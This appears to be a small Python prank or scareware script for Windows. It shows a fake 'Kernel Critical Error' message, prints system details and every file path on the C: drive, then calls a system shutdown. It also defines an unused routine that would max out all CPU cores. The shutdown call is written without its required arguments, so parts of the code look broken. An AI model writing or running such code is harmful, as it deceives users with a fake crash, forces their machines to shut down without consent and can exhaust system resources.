import multiprocessing
import time
import platform
import subprocess
import win32api

def cpu():
    def f(_):
        while True:
            pass

    if __name__ == '__main__':
        n = multiprocessing.cpu_count()
        with multiprocessing.Pool(n) as p:
            p.map(f, [None] * n)

print("Kernel Critical Error")
print(f"{platform.system()} can't works...")
time.sleep(1)
print("")
print(f"SYS: {platform.system()}")
print(f"REL: {platform.release()}")
print(f"MACH: {platform.machine()}")
print(f"NOD: {platform.node()}")
print(f"PROC: {platform.processor()}")

import os
from os import *

for top, dirs, files in os.walk('C:\\'):
    for nm in files:
        print(os.path.join(top, nm))

win32api.InitiateSystemShutdown()

